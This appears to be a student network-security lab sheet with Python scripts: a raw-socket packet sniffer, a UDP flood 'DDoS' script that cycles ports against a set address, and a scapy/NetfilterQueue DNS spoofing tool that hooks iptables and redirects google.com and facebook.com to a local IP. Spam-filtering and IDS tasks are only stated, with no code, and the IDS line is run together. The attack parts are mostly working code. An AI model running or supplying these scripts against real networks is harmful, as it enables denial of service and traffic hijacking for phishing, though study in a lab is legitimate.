Write a program to sniff packet sent over the local network and analyze it.


import os
import socket
from struct import unpack

os.system("clear")
print ("\n----------------------------------------------------")
print ("\n------      SNIFFING PACKET AND ANALYZING     ------")
print ("\n----------------------------------------------------\n")

#create an INET, raw socket

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

# receive a packet
while True:
    print ("\n\n")
    packet = s.recvfrom(65565)
    print (packet)

#packet string from tuple
    packet = packet[0]

#take first 20 characters for the ip header
    ip_header = packet[0:20]
    print ("\n\n")
    print (ip_header)
    
#now unpack them :)
    iph = unpack('!BBHHHBBH4s4s' , ip_header)
    
    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF

    iph_length = ihl * 4

    ttl = iph[5]
    protocol = iph[6]
    s_addr = socket.inet_ntoa(iph[8]);
    d_addr = socket.inet_ntoa(iph[9]);

    print ('\nVersion : ' + str(version) + '\nIP Header Length : ' + str(ihl) + '\nTTL : ' + str(ttl) + '\nProtocol : ' + str(protocol) + '\nSource Address : ' + str(s_addr) + '\nDestination Address : ' + str(d_addr))

    tcp_header = packet[iph_length:iph_length+20]
    
    #now unpack them :)
    tcph = unpack('!HHLLBBHHH' , tcp_header)

    source_port = tcph[0]
    dest_port = tcph[1]
    sequence = tcph[2]
    acknowledgement = tcph[3]
    doff_reserved = tcph[4]
    tcph_length = doff_reserved >> 4

    print ('\nSource Port : ' + str(source_port) + '\nDest Port : ' + str(dest_port) + '\nSequence Number : ' + str(sequence) + '\nAcknowledgement : ' + str(acknowledgement) + '\nTCP header length : ' + str(tcph_length))

    h_size = iph_length + tcph_length * 4
    data_size = len(packet) - h_size

#get data from the packet
    data = packet[h_size:]

    print ('\nData : ', str(data))
    print
    

print ("--------------------- End of Sniffer Program ----------------------")







Create an attack using python script and implement attack and analyze the effect of attack.a)DDOSAttack b)IPspoofing c)DNSAttack
DDOS Attack
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
#os.system("figlet DDos Attack")
print ("\n----------------------------------------------------")
print ("\n---------      D D O S     A T T A C K     ---------")
print ("\n----------------------------------------------------\n")
print

ip = '127.0.0.1'
port = 1024

print ("\nThe IP address of the Host to Attack is : ",ip)
print ("\nThe PORT address of the Host to Attack is : ",port)
print ("\n----------------------------------------------------\n")
#os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(2)
print ("[=====               ] 25%")
time.sleep(2)
print ("[==========          ] 50%")
time.sleep(2)
print ("[===============     ] 75%")
time.sleep(2)
print ("[====================] 100%")
time.sleep(2)
print ("\n----------------------------------------------------\n")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
#     time.sleep(1)
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
         port = 1
#         time.sleep(1)



DNS Attack

import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

os.system("clear")
print ("\n----------------------------------------------------")
print ("\n---------      D D O S     A T T A C K     ---------")
print ("\n----------------------------------------------------\n")



class DnsSnoof:
	def __init__(self, hostDict, queueNum):
		self.hostDict = hostDict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()

	def __call__(self):
		log.info("Snoofing....")
		os.system(
			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		self.queue.bind(self.queueNum, self.callBack)
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(
				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
			log.info("[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if scapyPacket.haslayer(DNSRR):
			try:
				log.info(f'[original] { scapyPacket[DNSRR].summary()}')
				queryName = scapyPacket[DNSQR].qname
				if queryName in self.hostDict:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata=self.hostDict[queryName])
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
				else:
					log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
			except IndexError as error:
				log.error(error)
			packet.set_payload(bytes(scapyPacket))
		return packet.accept()


if __name__ == '__main__':
	try:
		hostDict = {
			b"google.com.": "192.168.1.100",
			b"facebook.com.": "192.168.1.100"
		}
		queueNum = 0
		log.basicConfig(format='%(asctime)s - %(message)s',
						level = log.INFO)
		snoof = DnsSnoof(hostDict, queueNum)
		snoof()
	except OSError as error:
		log.error(error)





Write a program in pythonscript for SpamMailDetection(SpamFilteringImplementation).





IDSUseDistributedIDSAttackInformationtogatherslogfilesfromusersaroundthenetworkandpreparesreportstodetermineiftheirnetworkshaveencounteredintrusionattempts.


